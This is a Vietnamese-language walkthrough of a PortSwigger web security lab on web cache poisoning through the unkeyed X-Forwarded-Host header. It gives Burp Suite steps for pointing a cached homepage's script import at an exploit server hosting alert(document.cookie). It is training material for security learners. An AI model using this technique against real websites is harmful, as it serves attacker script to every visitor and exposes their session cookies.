---
layout: post
title: "Web cache poisoning"
render_with_liquid: false
categories:
  - Web Security
tags:
  - portswigger
  - web-cache-poisoning
source_collection: notion_portswigger
---
Created by: Nguyễn Giang Nam
Topics: Advanced

# **Lab 01: Web cache poisoning with an unkeyed header**

**Lab 01: Đầu độc bộ nhớ đệm web (Web cache poisoning) với header không được dùng làm khóa (unkeyed header)**

Lab này tồn tại lỗ hổng đầu độc bộ nhớ đệm web vì nó xử lý đầu vào từ một header không được dùng làm khóa (unkeyed header) theo cách không an toàn. Một người dùng bình thường thường xuyên truy cập trang chủ của trang web. Để giải quyết lab này, hãy đầu độc bộ nhớ đệm bằng một phản hồi thực thi lệnh alert(document.cookie) trên trình duyệt của người truy cập.

1. Khi Burp đang chạy, hãy tải trang chủ của trang web.
2. Trong Burp, đi tới **"Proxy" &gt; "HTTP history"** và xem xét các yêu cầu và phản hồi bạn đã tạo ra. Tìm yêu cầu GET cho trang chủ và gửi nó đến **Burp Repeater**.
3. Thêm một tham số truy vấn phá cache (cache-buster), ví dụ như ?cb=1234.
4. Thêm tiêu đề X-Forwarded-Host với một tên miền bất kỳ, ví dụ như example.com, và gửi yêu cầu.
5. Quan sát thấy rằng tiêu đề X-Forwarded-Host đã được sử dụng để tạo động một URL tuyệt đối nhằm nhập (import) một tệp JavaScript được lưu trữ tại /resources/js/tracking.js.
6. Gửi lại yêu cầu và quan sát rằng phản hồi có chứa tiêu đề X-Cache: hit. Điều này cho biết rằng phản hồi được lấy từ bộ nhớ đệm (cache).
7. Đi đến **exploit server** (máy chủ khai thác) và thay đổi tên tệp (File name) sao cho khớp với đường dẫn được sử dụng bởi phản hồi chứa lỗ hổng:
    
    /resources/js/tracking.js
    
8. Trong phần **Body**, nhập payload alert(document.cookie) và nhấp **Store** để lưu mã khai thác.
9. Mở yêu cầu GET cho trang chủ trong **Burp Repeater** và xóa tham số phá cache (cache buster) đi.
10. Thêm tiêu đề sau, nhớ điền ID máy chủ khai thác (exploit server ID) của riêng bạn:
    
    X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    
11. Gửi yêu cầu độc hại của bạn. Tiếp tục gửi lại yêu cầu cho đến khi bạn thấy URL máy chủ khai thác của mình được phản ánh trong phản hồi và tiêu đề X-Cache: hit xuất hiện.
12. Để mô phỏng nạn nhân, hãy tải URL đã bị đầu độc trong trình duyệt và đảm bảo rằng lệnh alert() được kích hoạt. Lưu ý rằng bạn phải thực hiện kiểm tra này trước khi cache hết hạn. Cache trong lab này hết hạn sau mỗi 30 giây.
13. Nếu lab vẫn chưa được giải quyết, nghĩa là nạn nhân đã không truy cập trang trong khi cache bị đầu độc. Hãy tiếp tục gửi yêu cầu vài giây một lần để đầu độc lại cache cho đến khi nạn nhân bị ảnh hưởng và lab được giải quyết.
